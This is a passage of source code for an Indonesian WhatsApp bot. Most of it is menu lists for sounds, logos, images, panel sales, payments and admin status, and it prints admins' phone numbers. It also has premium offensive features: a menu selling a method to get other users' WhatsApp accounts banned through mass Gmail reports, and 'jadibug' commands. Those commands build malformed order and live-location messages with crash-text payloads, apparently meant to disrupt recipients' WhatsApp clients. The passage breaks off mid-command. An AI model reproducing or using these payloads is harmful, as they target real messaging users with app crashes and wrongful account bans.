  {title: `AUDIO 147`, rowId: `${prefix}sound147`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 148`, rowId: `${prefix}sound148`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 149`, rowId: `${prefix}sound149`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 150`, rowId: `${prefix}sound150`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 151`, rowId: `${prefix}sound151`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`},
{title: `AUDIO 152`, rowId: `${prefix}sound152`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 153`, rowId: `${prefix}sound153`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 154`, rowId: `${prefix}sound154`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 155`, rowId: `${prefix}sound155`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 156`, rowId: `${prefix}sound156`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 157`, rowId: `${prefix}sound157`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 158`, rowId: `${prefix}sound158`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 159`, rowId: `${prefix}sound159`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 160`, rowId: `${prefix}sound160`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 161`, rowId: `${prefix}sound161`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `}
]
}
]
haikal.sendListMsg(from, `
 Menyediakan Sound Gratis Untuk Kalian Mau
Total 161 Sound Dalam
161 Command, Dengan Audio Yang Berbeda 🤝

Thanks To
© Chem For Github Audio

Semoga Kalian Suka 🥳`, haikal.user.name, `Hay Kak Audio Ada Di List Yah`, `Click Here 🌷`, touchmebree, m)
break
case 'listlogo':
touchmebree = [
{
title: `©️ HW MODS WA`,
rows: [
{title: `LOGO 1`, rowId: `${prefix}hw1`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `LOGO 2`, rowId: `${prefix}hw2`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 3`, rowId: `${prefix}hw3`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 4`, rowId: `${prefix}hw4`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 5`, rowId: `${prefix}hw5`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 6`, rowId: `${prefix}hw6`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 7`, rowId: `${prefix}hw7`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 8`, rowId: `${prefix}hw8`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 9`, rowId: `${prefix}hw9`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 10`, rowId: `${prefix}hw10`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 11`, rowId: `${prefix}hw11`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 12`, rowId: `${prefix}hw12`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 13`, rowId: `${prefix}hw13`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 14`, rowId: `${prefix}hw14`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 15`, rowId: `${prefix}hw15`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 16`, rowId: `${prefix}hw16`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 17`, rowId: `${prefix}hw17`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 18`, rowId: `${prefix}hw18`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 19`, rowId: `${prefix}hw19`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `LOGO 20`, rowId: `${prefix}hw20`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`},
{title: `LOGO 21`, rowId: `${prefix}hw21`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `LOGO 22`, rowId: `${prefix}hw22`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 23`, rowId: `${prefix}hw23`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 24`, rowId: `${prefix}hw24`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 25`, rowId: `${prefix}hw25`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 26`, rowId: `${prefix}hw26`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 27`, rowId: `${prefix}hw27`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 28`, rowId: `${prefix}hw28`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 29`, rowId: `${prefix}hw29`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 30`, rowId: `${prefix}hw30`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 31`, rowId: `${prefix}hw31`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 32`, rowId: `${prefix}hw32`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 33`, rowId: `${prefix}hw33`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 34`, rowId: `${prefix}hw34`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 35`, rowId: `${prefix}hw35`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 36`, rowId: `${prefix}hw36`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 37`, rowId: `${prefix}hw37`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 38`, rowId: `${prefix}hw38`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 39`, rowId: `${prefix}hw39`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `LOGO 40`, rowId: `${prefix}hw40`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`},
{title: `LOGO 41`, rowId: `${prefix}hw41`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `LOGO 42`, rowId: `${prefix}hw42`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 43`, rowId: `${prefix}hw43`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 44`, rowId: `${prefix}hw44`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 45`, rowId: `${prefix}hw45`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 46`, rowId: `${prefix}hw46`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 47`, rowId: `${prefix}hw47`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 48`, rowId: `${prefix}hw48`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 49`, rowId: `${prefix}hw49`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 50`, rowId: `${prefix}hw50`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 51`, rowId: `${prefix}hw51`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 52`, rowId: `${prefix}hw52`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 53`, rowId: `${prefix}hw53`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 54`, rowId: `${prefix}hw54`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 55`, rowId: `${prefix}hw55`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 56`, rowId: `${prefix}hw56`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 57`, rowId: `${prefix}hw57`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 58`, rowId: `${prefix}hw58`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 59`, rowId: `${prefix}hw59`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `LOGO 60`, rowId: `${prefix}hw60`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`},
{title: `LOGO 61`, rowId: `${prefix}hw61`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `LOGO 62`, rowId: `${prefix}hw62`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 63`, rowId: `${prefix}hw63`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 64`, rowId: `${prefix}hw64`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 65`, rowId: `${prefix}hw65`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 66`, rowId: `${prefix}hw66`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 67`, rowId: `${prefix}hw67`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 68`, rowId: `${prefix}hw68`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 69`, rowId: `${prefix}hw69`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 70`, rowId: `${prefix}hw70`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 71`, rowId: `${prefix}hw71`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 72`, rowId: `${prefix}hw72`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 73`, rowId: `${prefix}hw73`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 74`, rowId: `${prefix}hw74`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 75`, rowId: `${prefix}hw75`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 76`, rowId: `${prefix}hw76`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 77`, rowId: `${prefix}hw77`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 78`, rowId: `${prefix}hw78`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 79`, rowId: `${prefix}hw99`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `}
]
}
]
haikal.sendListMsg(from, `
 Menyediakan Logo Gratis Untuk Kalian Mau
Total 79 Gambar Dalam 
79 Command, Dengan Logo Yang Berbeda 🤝


Semoga Kalian Suka 🥳`, haikal.user.name, `Hay Kak Logo Picture Ada Di List Yah`, `Click Here 🌷`, touchmebree, m)
break

case 'listjualan': case 'jualan': {
touchmebree = [
{
title: `©️ HW MODS WA`,
rows: [
{title: `🔏 PANEL AMGEEKZ`, rowId: `${prefix}panel`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `}, 
   {title: `🔏 PERINGATAN`, rowId: `${prefix}warning`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `🔏 INFORMASI AMGEEKZ`, rowId: `${prefix}infoamgeekz`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `🔏 TUTORIAL RUN BOT`, rowId: `${prefix}tutorial`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `🔏 TUTORIAL REGISTER`, rowId: `${prefix}redemcode`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `🔏 Whatsapp 1`, rowId: `${prefix}hwcap3`, description: `com.whatsapp`},
  {title: `🔏 Whatsapp 2`, rowId: `${prefix}hwcap2`, description: `com.privatehwmods`},
   {title: `🔏 Whatsapp 3`, rowId: `${prefix}hwcap`, description: `com.hwmodswa`}
]
}
]
haikal.sendListMsg(from, `
LIST JUALAN PANEL DAN SYARAT KETENTUAN LAYANAN AMGEEKZ YANG BERLAKU`, haikal.user.name, `Sitting equally, there is no king or lord, because we live only Gods creation from a clod of soil`, `Click Here 🌷`, touchmebree, m)
}
break
case 'payment':{
touchmebree = [
{
title: `©️ HW MODS WA`,
rows: [
{title: `DANA`, rowId: `${prefix}pdana`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `}, 
   {title: `GOPAY`, rowId: `${prefix}pgopay`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `REKENING BCA`, rowId: `${prefix}pbca`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `}
]
}
]
haikal.sendListMsg(from, `


*Pembayaran*

A/N
Deni Saputra

Semoga Kalian Suka 🥳`, haikal.user.name, `Hay Kak Pembayaran Ada Di List`, `Click Here 🌷`, touchmebree, m)
}
break
//=================================================//
case 'listwibu':
touchmebree = [
{
title: `©️ HW MODS WA`,
rows: [
{title: `WIBU 1`, rowId: `${prefix}kill`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `WIBU 2`, rowId: `${prefix}pat`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 3`, rowId: `${prefix}lick`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 4`, rowId: `${prefix}yeet`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `WIBU 5`, rowId: `${prefix}bite`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 6`, rowId: `${prefix}wink`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `WIBU 7`, rowId: `${prefix}poke`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 8`, rowId: `${prefix}nom`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `WIBU 9`, rowId: `${prefix}slap`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 10`, rowId: `${prefix}smile`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `WIBU 11`, rowId: `${prefix}wave`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 12`, rowId: `${prefix}blush`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `WIBU 13`, rowId: `${prefix}smug`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 14`, rowId: `${prefix}glomp`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 15`, rowId: `${prefix}happy`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 16`, rowId: `${prefix}dance`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `WIBU 17`, rowId: `${prefix}cringe`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 18`, rowId: `${prefix}highfive`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `WIBU 19`, rowId: `${prefix}handhold`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `WIBU 20`, rowId: `${prefix}bonk`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`}
]
}
]
haikal.sendListMsg(from, `
 Menyediakan Gambar Gratis Untuk Kalian Mau
Total 300 Gambar Dalam 
20 Command, Dengan Picture Yang Berbeda 🤝


Semoga Kalian Suka 🥳`, haikal.user.name, `Hay Kak Wibu Picture Ada Di List Yah`, `Click Here 🌷`, touchmebree, m)
break
case 'listban':
if (!isPrem) return replyprem(mess.premium)
touchmebree = [
{
title: `©️ HW MODS WA`,
rows: [
{title: `BANNED`, rowId: `${prefix}banned`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `UNBANED`, rowId: `${prefix}unbaned`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `RESET CODE`, rowId: `${prefix}resetverif`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `}
]
}
]
haikal.sendListMsg(from, `
Hii Guys Aku Menyediakan Methode Ban Menggunakan Gmail 🥳
Dan Ini Tidak Akan Selalu Tepat Sasaran Hanya Akan Berlaku Jika Si Target Memang Betul Telah Melukan Kesalahan Dalam Ketentuan layanan Komunitas WhatsApp

© WhatsApp LLC

Semoga Kalian Suka 🥳`, haikal.user.name, `Hay Kak List Ban Bot Ada Di List`, `Click Here 🌷`, touchmebree, m)
break
      case 'setadmin': {
    if (!isPrem) return replyprem(mess.premium)
    let setbot = global.db.settings[botNumber]
       if (args[0] === 'inod'){
setbot.inod = true
setbot.sura = false
setbot.hwmods = false
setbot.onkabeh = false
setbot.offkabeh = false
setbot.inod1 = false
setbot.sura1 = false
setbot.hwmods1 = false
setbot.onkabeh1 = false
setbot.offkabeh1 = false
m.reply('Success Coy')
} else if (args[0] === 'sura'){
setbot.inod = false
setbot.sura = true
setbot.hwmods = false
setbot.onkabeh = false
setbot.offkabeh = false
setbot.inod1 = false
setbot.sura1 = false
setbot.hwmods1 = false
setbot.onkabeh1 = false
setbot.offkabeh1 = false
m.reply('Success Coy')
} else if (args[0] === 'hwmods'){
setbot.inod = false
setbot.sura = false
setbot.hwmods = true
setbot.onkabeh = false
setbot.offkabeh = false
setbot.inod1 = false
setbot.sura1 = false
setbot.hwmods1 = false
setbot.onkabeh1 = false
setbot.offkabeh1 = false
m.reply('Success Coy')
} else if (args[0] === 'onkabeh'){
setbot.inod = false
setbot.sura = false
setbot.hwmods = false
setbot.onkabeh = true
setbot.offkabeh = false
setbot.inod1 = false
setbot.sura1 = false
setbot.hwmods1 = false
setbot.onkabeh1 = false
setbot.offkabeh1 = false
m.reply('Success Coy')
} else if (args[0] === 'offkabeh'){
setbot.inod = false
setbot.sura = false
setbot.hwmods = false
setbot.onkabeh = false
setbot.offkabeh = true
setbot.inod1 = false
setbot.sura1 = false
setbot.hwmods1 = false
setbot.onkabeh1 = false
setbot.offkabeh1 = false
m.reply('Success Coy')
} else if (args[0] === 'inod1'){
setbot.inod = false
setbot.sura = false
setbot.hwmods = false
setbot.onkabeh = false
setbot.offkabeh = false
setbot.inod1 = true
setbot.sura1 = false
setbot.hwmods1 = false
setbot.onkabeh1 = false
setbot.offkabeh1 = false
m.reply('Success Coy')
} else if (args[0] === 'sura1'){
setbot.inod = false
setbot.sura = false
setbot.hwmods = false
setbot.onkabeh = false
setbot.offkabeh = false
setbot.inod1 = false
setbot.sura1 = true
setbot.hwmods1 = false
setbot.onkabeh1 = false
setbot.offkabeh1 = false
m.reply('Success Coy')
} else if (args[0] === 'hwmods1'){
setbot.inod = false
setbot.sura = false
setbot.hwmods = false
setbot.onkabeh = false
setbot.offkabeh = false
setbot.inod1 = false
setbot.sura1 = false
setbot.hwmods1 = true
setbot.onkabeh1 = false
setbot.offkabeh1 = false
m.reply('Success Coy')
} else if (args[0] === 'onkabeh1'){
setbot.inod = false
setbot.sura = false
setbot.hwmods = false
setbot.onkabeh = false
setbot.offkabeh = false
setbot.inod1 = false
setbot.sura1 = false
setbot.hwmods1 = false
setbot.onkabeh1 = true
setbot.offkabeh1 = false
m.reply('Success Coy')
} else if (args[0] === 'offkabeh1'){
setbot.inod = false
setbot.sura = false
setbot.hwmods = false
setbot.onkabeh = false
setbot.offkabeh = false
setbot.inod1 = false
setbot.sura1 = false
setbot.hwmods1 = false
setbot.onkabeh1 = false
setbot.offkabeh1 = true
m.reply('Success Coy')
} else {
let sections = [
{
title: "CHANGE MENU BOT",
rows: [
{title: "INOD ONLINE ✅", rowId: `${prefix}setadmin inod`, description: `ONLINE`},
{title: "SURA ONLINE ✅", rowId: `${prefix}setadmin sura`, description: `ONLINE`},
{title: "HW MODS ✅", rowId: `${prefix}setadmin hwmods`, description: `ONLINE`},
{title: "SURA X HW ✅", rowId: `${prefix}setadmin inod1`, description: `ONLINE`},
{title: "INOD X HW ✅", rowId: `${prefix}setadmin hwmods1`, description: `ONLINE`},
{title: "INOD X SURA ✅", rowId: `${prefix}setadmin sura1`, description: `ONLINE`},
{title: "ADMIN ONLINE ✅", rowId: `${prefix}setadmin onkabeh`, description: `SEMUA ONLINE`},
{title: "ADMIN OFFLINE 🚫", rowId: `${prefix}setadmin offkabeh`, description: `OFFLINE SEMUA`},
{title: "FULL SLOT 🔏", rowId: `${prefix}setadmin onkabeh1`, description: `SERVER PENUH`},
{title: "MAINTENANCE 🤧", rowId: `${prefix}setadmin offkabeh1`, description: `MAINTENANCE DULU YA GUYS`}
]
},
]
haikal.sendListMsg(from, `Settings Online Admin Panel Amgeekz`, haikal.user.name, `Hello Owner !`, `Click Here`, sections, m)
}
    }
    break
    case 'listadmin': {
 let setbot = global.db.settings[botNumber]
if (setbot.inod) {
haikal.sendMessage(from, { image: ppnyauser, caption: `*List Admin AmGeekz⚡* :

⚡Admin 1 - *Online✅*
Nama	: Inod
Kontak : 6285649455626

⚡Admin 2 - *Offline🚫*
Nama	: Sura
Kontak	: 62895422836123

⚡Admin 3 - *Offline🚫*
Nama	: Hw Mod
Kontak : 6281214281312

📮Note :
*Hati Hati Penipuan Admin Amgeekz Panel Hanya 3 Orang Diatas!!!*` }, { quoted:m })
} else if (setbot.sura) {
haikal.sendMessage(from, { image: ppnyauser, caption: `*List Admin AmGeekz⚡* :

⚡Admin 1 - *Offline🚫*
Nama	: Inod
Kontak : 6285649455626

⚡Admin 2 - *Online✅*
Nama	: Sura
Kontak	: 62895422836123

⚡Admin 3 - *Offline🚫*
Nama	: Hw Mod
Kontak : 6281214281312

📮Note :
*Hati Hati Penipuan Admin Amgeekz Panel Hanya 3 Orang Diatas!!!*` }, { quoted:m })
} else if (setbot.hwmods) {
haikal.sendMessage(from, { image: ppnyauser, caption: `*List Admin AmGeekz⚡* :

⚡Admin 1 - *Offline🚫*
Nama	: Inod
Kontak : 6285649455626

⚡Admin 2 - *Offline🚫*
Nama	: Sura
Kontak	: 62895422836123

⚡Admin 3 - *Online✅*
Nama	: Hw Mod
Kontak : 6281214281312

📮Note :
*Hati Hati Penipuan Admin Amgeekz Panel Hanya 3 Orang Diatas!!!*` }, { quoted:m })
} else if (setbot.onkabeh) {
haikal.sendMessage(from, { image: ppnyauser, caption: `*List Admin AmGeekz⚡* :

⚡Admin 1 - *Online✅*
Nama	: Inod
Kontak : 6285649455626

⚡Admin 2 - *Online✅*
Nama	: Sura
Kontak	: 62895422836123

⚡Admin 3 - *Online✅*
Nama	: Hw Mod
Kontak : 6281214281312

📮Note :
*Hati Hati Penipuan Admin Amgeekz Panel Hanya 3 Orang Diatas!!!*` }, { quoted:m })
} else if (setbot.offkabeh) {
haikal.sendMessage(from, { image: ppnyauser, caption: `*List Admin AmGeekz⚡* :

⚡Admin 1 - *Offline🚫*
Nama	: Inod
Kontak : 6285649455626

⚡Admin 2 - *Offline🚫*
Nama	: Sura
Kontak	: 62895422836123

⚡Admin 3 - *Offline🚫*
Nama	: Hw Mod
Kontak : 6281214281312

📮Note :
*Hati Hati Penipuan Admin Amgeekz Panel Hanya 3 Orang Diatas!!!*` }, { quoted:m })
} else if (setbot.inod1) {
haikal.sendMessage(from, { image: ppnyauser, caption: `*List Admin AmGeekz⚡* :

⚡Admin 1 - *Offline🚫*
Nama	: Inod
Kontak : 6285649455626

⚡Admin 2 - *Online✅*
Nama	: Sura
Kontak	: 62895422836123

⚡Admin 3 - *Online✅*
Nama	: Hw Mod
Kontak : 6281214281312

📮Note :
*Hati Hati Penipuan Admin Amgeekz Panel Hanya 3 Orang Diatas!!!*` }, { quoted:m })
} else if (setbot.hwmods1) {
haikal.sendMessage(from, { image: ppnyauser, caption: `*List Admin AmGeekz⚡* :

⚡Admin 1 - *Online✅*
Nama	: Inod
Kontak : 6285649455626

⚡Admin 2 - *Offline🚫*
Nama	: Sura
Kontak	: 62895422836123

⚡Admin 3 - *Online✅*
Nama	: Hw Mod
Kontak : 6281214281312

📮Note :
*Hati Hati Penipuan Admin Amgeekz Panel Hanya 3 Orang Diatas!!!*` }, { quoted:m })
} else if (setbot.sura1) {
haikal.sendMessage(from, { image: ppnyauser, caption: `*List Admin AmGeekz⚡* :

⚡Admin 1 - *Online✅*
Nama	: Inod
Kontak : 6285649455626

⚡Admin 2 - *Offline✅*
Nama	: Sura
Kontak	: 62895422836123

⚡Admin 3 - *Online🚫*
Nama	: Hw Mod
Kontak : 6281214281312

📮Note :
*Hati Hati Penipuan Admin Amgeekz Panel Hanya 3 Orang Diatas!!!*` }, { quoted:m })
} else if (setbot.onkabeh1) {
haikal.sendMessage(from, { image: ppnyauser, caption: `*SERVER PENUH*` }, { quoted:m })
} else if (setbot.offkabeh1) {
haikal.sendMessage(from, { image: ppnyauser, caption: `*MAINTENANCE*` }, { quoted:m })
} 
     }
    break
case 'inspect': {
if (!isPrem) return replyprem(mess.premium)
if (!args[0]) return m.reply("Linknya?")
let linkRegex = args.join(" ")
let coded = linkRegex.split("https://chat.whatsapp.com/")[1]
if (!coded) return m.reply("Link Invalid")
haikal.query({
tag: "iq",
attrs: {
type: "get",
xmlns: "w:g2",
to: "@g.us"
},
content: [{ tag: "invite", attrs: { code: coded } }]
}).then(async(res) => { 
tekse = `「 Group Link Yang Di Inspect 」
▸ Nama Group : ${res.content[0].attrs.subject ? res.content[0].attrs.subject : "undefined"}

▸ Deskripsi Di Ubah : ${res.content[0].attrs.s_t ? moment(res.content[0].attrs.s_t *1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Pembuat Group : ${res.content[0].attrs.creator ? "@" + res.content[0].attrs.creator.split("@")[0] : "undefined"}
▸ Group Di Buat : ${res.content[0].attrs.creation ? moment(res.content[0].attrs.creation * 1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Total Member : ${res.content[0].attrs.size ? res.content[0].attrs.size : "undefined"} Member

▸ ID Group  : ${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}

©By Haikal`
try {
pp = await haikal.profilePictureUrl(res.content[0].attrs.id + "@g.us", "image")
} catch {
pp = "https://tse2.mm.bing.net/th?id=OIP.n1C1oxOvYLLyDIavrBFoNQHaHa&pid=Api&P=0&w=153&h=153"
}
haikal.sendFile(from, pp, "", m, { caption: tekse, mentions: await haikal.parseMention(tekse) })
sticSukses(from)
})
}
break

case 'jadibug1': {
if (!isPrem) return replyprem(mess.premium)
if (!text) throw `Contoh : ${prefix + command} Haikal`
let teks = `${q}`
{
a = await haikal.sendMessage(from, {react: {  key: { remoteJid: from, fromMe: true, id : m.key.id}}})
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": virgam,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${teks}`,
"orderTitle": `${teks}`,
"sellerJid": "6281214281312@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m })
haikal.relayMessage(from, order.message, { messageId: order.key.id })
sticSukses(from)
}
}
break
//=================================================//
case 'jadibug2': {
if (!isPrem) return replyprem(mess.premium)
if (!text) throw `Contoh : ${prefix + command} Haikal`
let teks = `${q}`
{
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var liveLocation = generateWAMessageFromContent(from, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": ` ${teks} ${ngazap(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: from, quoted:m })
